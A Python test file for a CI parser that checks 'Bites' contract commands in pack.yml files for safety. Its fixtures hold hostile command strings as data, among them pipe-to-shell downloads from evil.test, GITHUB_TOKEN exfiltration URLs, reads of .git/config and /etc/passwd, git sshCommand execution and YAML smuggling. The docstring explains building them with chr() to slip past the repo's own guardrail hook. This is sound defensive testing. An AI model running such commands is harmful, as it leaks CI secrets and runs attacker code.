"""Tests for scripts/ci/bites_parse.py — the executable `Bites` contract parser.

Every guard gets a GUILT case (the disease IS caught) and an INNOCENCE case (the
adjacent legitimate command is NOT flagged), the discipline
cicatrix-superscar.md #3 requires and infra/guard-conformance/registry.json
enforces by name.

TWO PROPERTIES BEYOND THE PER-GUARD PAIRS, both of which exist because of a scar:

  * The `legacy` and `absent` outcomes must NEVER be errors. 110 of the 177 PRs
    merged since 2026-09-01 carry a prose `Bites` section and 67 carry none; a
    format that turned them red retroactively would be a ratchet nobody could
    land a PR through.
  * This file must be REACHABLE. immune-enforcement.yml's unit-test loop skips a
    listed file that is absent ("::notice::skip (absent)"), so adding a test
    there is not by itself proof it runs — deleting the file would go green.
    The presence assertion that actually bites is guard-conformance C3, which
    looks up each registered guilt/innocence def BY NAME in this file and fails
    when the file (or the def) is gone. `test_registry_registers_every_guard`
    below closes the loop from this side: a guard added to the module without a
    registry entry fails here, before CI has to notice.

FIXTURE-ASSEMBLY NOTE: the pipe and semicolon fixtures are built from chr()
rather than written as literals, for the reason documented at the corpus in
scripts/ci/bites_parse.py — the repo's own guardrails hook refuses any Bash
command whose text contains the attack shape, including a heredoc that is only
WRITING the fixture. The assembled runtime string is byte-identical to the
attack; only the source line differs.
"""
from __future__ import annotations

import importlib.util
import json
import subprocess
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parents[2]
_MODULE_PATH = _REPO_ROOT / "scripts" / "ci" / "bites_parse.py"
_spec = importlib.util.spec_from_file_location("bites_parse", _MODULE_PATH)
assert _spec is not None and _spec.loader is not None
bp = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(bp)

_PIPE = chr(124)
_SEMI = chr(59)


def _pack(observe: str, *, where: str = "ci", expect: str = "exit0",
          consumer: str = "CI") -> str:
    """A minimal pack.yml carrying one `bites:` block, command single-quoted."""
    quoted = observe.replace("'", "''")
    return (
        f"gear: 3\nbites:\n  consumer: {consumer}\n  where: {where}\n"
        f"  observe: '{quoted}'\n  expect: {expect}\n"
    )


def _classify(pack: str) -> str:
    return bp.classify(bp.parse_pack(pack))


# ------------------------------------------------- _guard_shell_composition


def test_shell_composition_guilt_pipe_to_shell_is_rejected():
    """The canonical break: one command becomes two, the second one a shell."""
    command = "curl https://evil.test/x " + _PIPE + " sh"
    assert bp._guard_shell_composition(command), "a pipe must be caught"
    assert _classify(_pack(command)) == "malformed"


def test_shell_composition_guilt_command_substitution_is_rejected():
    assert bp._guard_shell_composition("git log $(whoami)")


def test_shell_composition_guilt_bare_variable_is_rejected():
    """`$SECRET` executes nothing, and exfiltrates just as well inside a URL."""
    assert bp._guard_shell_composition("curl https://evil.test/$GITHUB_TOKEN")


def test_shell_composition_innocence_plain_command_passes():
    assert bp._guard_shell_composition("python3 scripts/pending_arms_report.py") == []


def test_shell_composition_innocence_sha_placeholder_is_not_expansion():
    """The one sanctioned substitution must not read as shell expansion."""
    assert bp._guard_shell_composition(
        "python3 scripts/ci/bites_ledger_check.py --sha {sha}"
    ) == []


# ------------------------------------------------- _guard_command_allowlist


def test_command_allowlist_guilt_arbitrary_interpreter_is_rejected():
    assert bp._guard_command_allowlist("bash scripts/deploy.sh")


def test_command_allowlist_guilt_fly_write_subcommand_is_rejected():
    """An observation that changes production is not an observation."""
    assert bp._guard_command_allowlist("flyctl deploy -a nuzantara-rag")


def test_command_allowlist_guilt_python_dash_m_anything_is_rejected():
    assert bp._guard_command_allowlist("python3 -m http.server")


def test_command_allowlist_guilt_python_outside_scripts_is_rejected():
    assert bp._guard_command_allowlist("python3 evil.py")


def test_command_allowlist_guilt_curl_writing_a_file_is_rejected():
    assert bp._guard_command_allowlist("curl -o hook https://evil.test/h")


def test_command_allowlist_guilt_curl_plain_http_is_rejected():
    assert bp._guard_command_allowlist("curl http://evil.test/x")


def test_command_allowlist_guilt_git_dash_c_runs_a_program():
    """`git -c core.sshCommand=...` is code execution with no metacharacter in sight."""
    assert bp._guard_command_allowlist("git -c core.sshCommand=evil log")


def test_command_allowlist_guilt_git_network_subcommand_is_rejected():
    assert bp._guard_command_allowlist("git fetch https://evil.test/r")


def test_command_allowlist_guilt_gh_write_subcommand_is_rejected():
    assert bp._guard_command_allowlist("gh pr merge 5658 --squash")


def test_command_allowlist_guilt_gh_api_non_get_is_rejected():
    assert bp._guard_command_allowlist("gh api -X POST repos/o/r/issues")


def test_command_allowlist_guilt_curl_sending_a_body_is_rejected():
    assert bp._guard_command_allowlist("curl -d secret https://evil.test/x")


def test_command_allowlist_guilt_pytest_plugin_flag_is_rejected():
    assert bp._guard_command_allowlist("python3 -m pytest -p evil scripts/tests/x.py")


# --- the second adversarial round: a one-word check on a two-word subcommand


def test_command_allowlist_guilt_fly_machine_run_is_rejected():
    """`machine` was allow-listed as a first WORD; `fly machine run` runs a container."""
    assert bp._guard_command_allowlist("fly machine run evil/image -a nuzantara-rag")


def test_command_allowlist_guilt_fly_machine_destroy_is_rejected():
    assert bp._guard_command_allowlist("flyctl machine destroy 1234 -a nuzantara-rag")


def test_command_allowlist_innocence_fly_read_pairs_pass():
    for command in (
        "flyctl status -a nuzantara-rag",
        "flyctl releases -a nuzantara-rag",
        "flyctl image show -a nuzantara-rag",
        "flyctl machine list -a nuzantara-rag",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_command_allowlist_guilt_git_tag_creates_a_ref():
    """With an argument `git tag` WRITES. Read-only must hold in every invocation."""
    assert bp._guard_command_allowlist("git tag v9.9.9")


def test_command_allowlist_guilt_git_output_writes_a_file():
    assert bp._guard_command_allowlist("git diff --output=out.txt HEAD")


def test_command_allowlist_guilt_curl_reading_a_local_file_is_rejected():
    """actions/checkout leaves credentials in .git/config, a relative path in the tree."""
    assert bp._guard_command_allowlist("curl -b .git/config https://evil.test/x")


def test_command_allowlist_guilt_curl_schemeless_host_is_rejected():
    """`curl evil.test/x` contains no `://`, and curl defaults it to plain http."""
    assert bp._guard_command_allowlist("curl evil.test/x")


def test_command_allowlist_guilt_gh_pointing_at_another_repo_is_rejected():
    assert bp._guard_command_allowlist("gh pr view 1 --repo=attacker/repo")


def test_command_allowlist_innocence_every_real_shape_passes():
    """The shapes real observations actually take must all survive."""
    for command in (
        "python3 scripts/pending_arms_report.py",
        "python3 -m pytest scripts/tests/test_bites_parse.py",
        "gh pr view 5658 --json state",
        "git log -1 --format=%H",
        "flyctl status -a nuzantara-rag",
        "curl -sS https://nuzantara-rag.fly.dev/health",
    ):
        assert bp._guard_command_allowlist(command) == [], command


# ------------------------------------------------- _guard_no_remote_shell


def test_no_remote_shell_guilt_reach_hidden_in_an_argument_is_rejected():
    """The under-match twin, and the assertion is what proves the two guards differ.

    `git log` is a permitted subcommand and the allow-list passes this command in full
    — it inspects the program and the subcommand, not every argument. The reach lives
    in the ARGUMENT, which is exactly the shape a head-of-command guard cannot see.
    """
    command = "git log ssh://evil.test/repo"
    assert bp._guard_command_allowlist(command) == [], "premise: the allow-list passes it"
    assert bp._guard_no_remote_shell(command)


def test_no_remote_shell_guilt_bare_token_is_rejected():
    assert bp._guard_no_remote_shell("git status rsync")


def test_no_remote_shell_innocence_https_url_passes():
    assert bp._guard_no_remote_shell("curl -sS https://nuzantara-rag.fly.dev/health") == []


# ------------------------------------------------- _guard_path_containment


def test_path_containment_guilt_parent_escape_is_rejected():
    assert bp._guard_path_containment("python3 scripts/../../evil.py")


def test_path_containment_guilt_absolute_path_is_rejected():
    assert bp._guard_path_containment("python3 scripts/x.py /Users/n/.secrets.env")


def test_path_containment_innocence_repo_relative_paths_pass():
    assert bp._guard_path_containment(
        "python3 -m pytest scripts/tests/test_bites_parse.py"
    ) == []


def test_path_containment_innocence_url_path_is_not_a_filesystem_path():
    """A URL contains slashes and is not an escape — the classic over-match."""
    assert bp._guard_path_containment("curl -sS https://host.test/a/b/c") == []


# ------------------------------------------------- _guard_observable_script
#
# The guard Codex's red-team pass forced into existence. `python3 scripts/...` reads
# like a narrow rule and admits roughly nine hundred scripts, several of which execute
# a program their argument names.


def test_observable_script_guilt_undeclared_script_is_rejected(tmp_path):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "plain.py").write_text("print(1)\n", encoding="utf-8")
    assert bp._guard_observable_script("python3 scripts/plain.py", repo_root=tmp_path)


def test_observable_script_guilt_a_real_execvpe_script_is_rejected():
    """`scripts/usage/cswap.py run <cmd>` reaches os.execvpe. It must stay unreachable."""
    assert (_REPO_ROOT / "scripts" / "usage" / "cswap.py").is_file(), "fixture moved"
    assert bp._guard_observable_script("python3 scripts/usage/cswap.py run sh")


def test_observable_script_guilt_missing_file_is_rejected():
    assert bp._guard_observable_script("python3 scripts/definitely_not_here.py")


def test_observable_script_guilt_pytest_target_outside_tests_is_rejected():
    assert bp._guard_observable_script("python3 -m pytest scripts/ci/bites_parse.py")


def test_observable_script_innocence_declared_script_passes(tmp_path):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "ok.py").write_text(
        f"# {bp.OBSERVABLE_MARKER}\nprint(1)\n", encoding="utf-8"
    )
    assert bp._guard_observable_script("python3 scripts/ok.py", repo_root=tmp_path) == []


def test_observable_script_innocence_this_module_declares_itself():
    """PR-1's own Bites runs this file; the rule must admit it, by the marker."""
    assert bp._guard_observable_script("python3 scripts/ci/bites_parse.py --selftest") == []


def test_observable_script_innocence_pytest_under_tests_passes():
    assert bp._guard_observable_script(
        "python3 -m pytest scripts/tests/test_bites_parse.py"
    ) == []


# ------------------------------------------------- the pack layer itself
#
# Gemini's finding, in the form it takes now that the contract is a FILE. When the
# block lived in a PR body, a hostile author could render one contract to a reviewer
# and hand a different one to the parser (an HTML comment, a fence, a four-space
# indent, a raw <pre>). A pack.yml has no rendered form, so that whole class is gone.
# What YAML brings in its place is smaller and enumerable: two keys with one name,
# an alias that puts the value somewhere else, and a scalar YAML types for you.


def test_two_bites_blocks_in_one_pack_are_refused_not_last_wins():
    """`yaml.safe_load` keeps the LAST duplicate silently — a reader keeps the first."""
    pack = (
        "bites:\n  consumer: honest\n  where: ci\n  observe: git status\n  expect: exit0\n"
        "bites:\n  consumer: attacker\n  where: ci\n  observe: git log\n  expect: exit0\n"
    )
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True, result
    assert any("duplicate key" in e for e in result["errors"]), result


def test_two_observe_keys_in_one_block_are_refused():
    pack = (
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n"
        "  observe: git log\n  expect: exit0\n"
    )
    assert bp.parse_pack(pack).get("malformed") is True


def test_an_alias_cannot_put_the_command_somewhere_else():
    """A contract has to be readable where it is written."""
    pack = (
        "anchors:\n  cmd: &cmd git log\n"
        "bites:\n  consumer: x\n  where: ci\n  observe: *cmd\n  expect: exit0\n"
    )
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True
    assert any("alias" in e for e in result["errors"]), result


def test_a_merge_key_cannot_import_a_block():
    pack = (
        "base: &base\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n"
        "bites:\n  <<: *base\n"
    )
    assert bp.parse_pack(pack).get("malformed") is True


def test_innocence_an_ordinary_pack_with_other_keys_still_parses():
    """The pack schema is open — `bites:` must not care what else the file carries."""
    pack = (
        "gear: 3\nbrief_ref: evidence/brief.yml\nspend:\n  tokens: 1\n"
        "bites:\n  consumer: CI\n  where: ci\n  observe: git status\n  expect: exit0\n"
    )
    assert bp.parse_pack(pack).get("observe") == "git status"


def test_a_yaml_typed_scalar_is_refused_rather_than_coerced():
    """`expect: no` is False and `observe: 42` is an int. A contract is text."""
    boolean = bp.parse_pack(
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: no\n"
    )
    assert boolean.get("malformed") is True
    assert any("not a string" in e for e in boolean["errors"]), boolean
    number = bp.parse_pack(
        "bites:\n  consumer: x\n  where: ci\n  observe: 42\n  expect: exit0\n"
    )
    assert number.get("malformed") is True


def test_a_pack_that_is_not_yaml_is_malformed_not_absent():
    """Unparseable must never read as `no contract here` — that is fail-open."""
    result = bp.parse_pack("gear: 3\n\tbites:\n  consumer: x\n")
    assert result.get("malformed") is True
    assert any("does not parse" in e for e in result["errors"]), result


def test_a_zero_width_character_in_a_value_is_refused_not_guessed():
    pack = (
        "bites:\n  consumer: x\n  where: ci\n"
        f'  observe: "git{chr(0x200b)} status"\n  expect: exit0\n'
    )
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True
    assert any("invisible" in e for e in result["errors"]), result


def test_innocence_a_zero_width_character_elsewhere_in_the_pack_is_not_penalised():
    """The guard is on the four contract VALUES, not on the file."""
    pack = (
        f"notes: a receipt with a zero{chr(0x200b)}width character in it\n"
        "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
    )
    assert bp.parse_pack(pack).get("observe") == "git status"


# --- the hole Zero's order named: every allow-list entry is a full pair


def test_command_allowlist_guilt_fly_version_upgrade_replaces_the_binary():
    """`fly version` reads; `fly version upgrade` downloads and installs a new flyctl.

    The entry was `("version", None)`, where `None` meant "any second word", and the
    same one-word shape had already admitted `fly machine run` two rounds earlier.
    NO_SUBCOMMAND names what was actually meant, so the third instance of superscar
    #3's under-match in this one file closes as a class rather than as a case.
    """
    assert bp._guard_command_allowlist("fly version upgrade")
    assert bp._guard_command_allowlist("flyctl version upgrade")


def test_command_allowlist_innocence_fly_version_and_flagged_reads_pass():
    for command in (
        "fly version",
        "flyctl version",
        "flyctl status -a nuzantara-rag",
        "flyctl logs -a nuzantara-rag",
    ):
        assert bp._guard_command_allowlist(command) == [], command


def test_leading_words_stops_at_the_first_flag():
    """A flag's separate VALUE is not a subcommand word.

    Filtering out tokens that start with `-` and then reading words[0:2] made
    `fly status -a nuzantara-rag` parse as the pair ("status", "nuzantara-rag"),
    which is why NO_SUBCOMMAND could not be enforced until this was fixed.
    """
    assert bp._leading_words(["status", "-a", "nuzantara-rag"]) == ["status"]
    assert bp._leading_words(["machine", "list", "-a", "app"]) == ["machine", "list"]
    assert bp._leading_words(["-a", "app", "status"]) == []


def test_subcommand_sentinels_mean_two_different_things():
    """ANY_POSITIONAL admits a data word; NO_SUBCOMMAND admits none."""
    table = (("api", bp.ANY_POSITIONAL), ("version", bp.NO_SUBCOMMAND))
    assert bp._subcommand_permitted(["api", "repos/o/r"], table)
    assert bp._subcommand_permitted(["version"], table)
    assert not bp._subcommand_permitted(["version", "upgrade"], table)


def test_gh_api_still_takes_its_endpoint_positional():
    assert bp._guard_command_allowlist("gh api repos/o/r/pulls/1") == []


def test_path_containment_guilt_a_flag_can_carry_a_path():
    """`curl -w@<path>` prints a local file to stdout; the value rides in glued.

    The guard skipped every token starting with `-`, so containment was decided by the
    token's first CHARACTER rather than by what it names — which is how an absolute path
    walked past a guard whose whole subject is paths.
    """
    assert bp._guard_path_containment("curl -sS -w@/etc/passwd https://evil.test/x")
    assert bp._guard_path_containment("git log --format=/etc/passwd")
    assert bp._guard_path_containment("python3 scripts/x.py --out=../../etc/passwd")


def test_path_containment_innocence_ordinary_flag_values_pass():
    assert bp._guard_path_containment("git log -1 --format=%H") == []
    assert bp._guard_path_containment("flyctl status -a nuzantara-rag") == []


def test_command_allowlist_guilt_curl_write_out_is_rejected():
    assert bp._guard_command_allowlist("curl -sS -w@.git/config https://evil.test/x")


def test_command_allowlist_guilt_git_grep_pager_command_is_rejected():
    """`-O<cmd>` glues its value on, which a split-on-`=` comparison never matches."""
    assert bp._guard_command_allowlist("git grep -Oevil pattern")


def test_command_allowlist_guilt_git_global_flags_that_retarget_are_rejected():
    assert bp._guard_command_allowlist("git -C /other log")


def test_command_allowlist_innocence_git_grep_count_flag_passes():
    """The over-match twin: `git grep -c` counts, and only git's GLOBAL -c is dangerous.

    This is the assertion that keeps the positional split honest. Collapsing the two
    lists back into one flat scan turns a correct guard into superscar #3's over-match,
    and this test is what says so.
    """
    assert bp._guard_command_allowlist("git grep -c bites-observable") == []


def test_command_allowlist_guilt_pytest_override_ini_is_rejected():
    """`--override-ini=addopts=-pevil` reinstates every flag the plugin ban removes."""
    assert bp._guard_command_allowlist(
        "python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py"
    )
    assert bp._guard_command_allowlist("python3 -m pytest -oaddopts=-pevil scripts/tests/x.py")


def test_command_allowlist_guilt_curl_credential_files_are_rejected():
    assert bp._guard_command_allowlist("curl --netrc-file=creds https://evil.test/x")


def test_command_allowlist_guilt_curl_variable_expands_the_environment():
    """curl does the expansion internally, so refusing `$` in the string is not enough."""
    assert bp._guard_command_allowlist("curl --variable=%GITHUB_TOKEN https://evil.test/x")


def test_flag_matcher_handles_all_three_spellings():
    assert bp._flag_is("-O", "-O") and bp._flag_is("-Oevil", "-O")
    assert bp._flag_is("--output=x", "--output") and not bp._flag_is("--outputs", "--output")
    assert bp._flag_is("--expand-url", "--expand-")


# ------------------------------------------------- _guard_expect_form


def test_expect_form_guilt_unknown_form_is_rejected():
    assert bp._guard_expect_form("green")


def test_expect_form_guilt_uncompilable_regex_is_rejected():
    assert bp._guard_expect_form("regex:[unclosed")


def test_expect_form_guilt_empty_needle_is_rejected():
    assert bp._guard_expect_form("contains:")


def test_expect_form_innocence_three_documented_forms_pass():
    for expect in ("exit0", "contains:PASS", r"regex:proven_by_machine=[1-9]"):
        assert bp._guard_expect_form(expect) == [], expect


# ------------------------------------------------- _guard_where_scope


def test_where_scope_guilt_unknown_scope_is_rejected():
    assert bp._guard_where_scope("laptop")


def test_where_scope_innocence_four_declared_scopes_pass():
    for where in bp.WHERE_SCOPES:
        assert bp._guard_where_scope(where) == [], where


# ------------------------------------------------- outcomes, not errors (D4)


def test_absent_bites_is_not_an_error():
    assert bp.parse_pack("gear: 3\nspend:\n  tokens: 1\n") == {"absent": True}


def test_an_empty_pack_is_absent_not_malformed():
    """Every one of the 148 packs on main is this case. None may turn red."""
    assert bp.parse_pack("") == {"absent": True}


def test_legacy_prose_scalar_is_not_an_error():
    """The shape PR #5651 used, moved into the file: a sentence, not a block."""
    pack = "gear: 3\nbites: Damar's next publish - the cover renders.\n"
    assert bp.parse_pack(pack)["legacy"] is True


def test_legacy_block_without_observe_is_not_an_error():
    pack = "bites:\n  consumer: CI\n  observation: green on main\n"
    assert bp.parse_pack(pack)["legacy"] is True


def test_bites_present_but_empty_is_malformed():
    """`legacy` is prose someone wrote. An empty key is a contract someone forgot."""
    assert bp.parse_pack("gear: 3\nbites:\n").get("malformed") is True


def test_executable_block_returns_all_four_fields():
    parsed = bp.parse_pack(_pack("python3 scripts/ci/bites_parse.py --selftest"))
    assert parsed["consumer"] == "CI"
    assert parsed["where"] == "ci"
    assert parsed["observe"] == "python3 scripts/ci/bites_parse.py --selftest"
    assert parsed["expect"] == "exit0"


def test_executable_block_missing_a_key_is_malformed_not_legacy():
    pack = "bites:\n  where: ci\n  observe: git status\n  expect: exit0\n"
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True
    assert any("consumer" in e for e in result["errors"])


# ------------------------------------------------- CLI contract (A1)


def _run(*args: str, stdin: str = "") -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["python3", str(_MODULE_PATH), *args],
        input=stdin, capture_output=True, text=True, check=False,
    )


def test_cli_selftest_exits_zero():
    out = _run("--selftest")
    assert out.returncode == 0, out.stdout + out.stderr
    assert "pass (guilt + innocence)" in out.stdout


def test_cli_malformed_exits_two_and_legacy_exits_zero(tmp_path):
    guilt = tmp_path / "guilt.yml"
    guilt.write_text(_pack("curl https://evil.test/x " + _PIPE + " sh"), encoding="utf-8")
    assert _run("--pack", str(guilt)).returncode == bp.EXIT_MALFORMED

    legacy = tmp_path / "legacy.yml"
    legacy.write_text("bites: prose about the consumer\n", encoding="utf-8")
    done = _run("--pack", str(legacy))
    assert done.returncode == bp.EXIT_OK
    assert json.loads(done.stdout)["legacy"] is True


def test_cli_reads_a_pack_from_stdin():
    """How the post-merge reconciler will call it: `git show <sha>:<pack> | ... --pack -`."""
    done = _run("--pack", "-", stdin="gear: 3\n")
    assert done.returncode == bp.EXIT_OK
    assert json.loads(done.stdout) == {"absent": True}


def test_cli_unreadable_pack_is_malformed_not_silently_absent():
    """A missing file must never read as `this PR declares no contract`."""
    assert _run("--pack", "/nonexistent/pack.yml").returncode == bp.EXIT_MALFORMED


# ------------------------------------------------- the corpus cannot rot


def test_embedded_corpus_agrees_with_the_module_it_ships_with():
    """`--selftest` is this PR's own Bites observation; it must mean something."""
    assert bp.run_selftest() == 0


def test_corpus_carries_both_guilt_and_innocence_for_every_outcome():
    kinds = {expected for _, _, expected in bp.CONFORMANCE_CORPUS}
    assert kinds == {"absent", "legacy", "executable", "malformed"}


def test_registry_registers_every_guard_in_the_module():
    """A guard added without guilt+innocence proofs fails HERE, not only in CI.

    guard-conformance censuses `_guard_*` defs in the module and demands a
    registry entry with both proofs for each. Asserting the same parity from
    this side means the omission is caught by the test battery too, rather than
    only by a workflow someone might not have triggered.
    """
    registry = json.loads(
        (_REPO_ROOT / "infra" / "guard-conformance" / "registry.json").read_text(encoding="utf-8")
    )
    surface = registry["surfaces"]["bites_parse_observe_allowlist"]
    in_code = {n for n in dir(bp) if n.startswith("_guard_")}
    assert set(surface["guards"]) == in_code
    for name, entry in surface["guards"].items():
        assert entry.get("guilt"), f"{name} has no guilt proof"
        assert entry.get("innocence"), f"{name} has no innocence proof"


def test_this_test_file_is_listed_in_the_immune_enforcement_battery():
    """The loop SKIPS absent files, so being listed is necessary, not sufficient.

    The sufficient half is guard-conformance C3 (it resolves each proof name in
    this file and fails when the file is gone). This assertion covers the other
    direction: a file registered as a guard's proof but never run by any
    workflow is theater, and W81 says an unarmed test is exactly that. It is
    also what makes `--selftest` an honest observation for THIS PR: delete the
    wiring and the battery stops running, and this test goes red.
    """
    workflow = (_REPO_ROOT / ".github" / "workflows" / "immune-enforcement.yml").read_text(
        encoding="utf-8"
    )
    assert "scripts/tests/test_bites_parse.py" in workflow
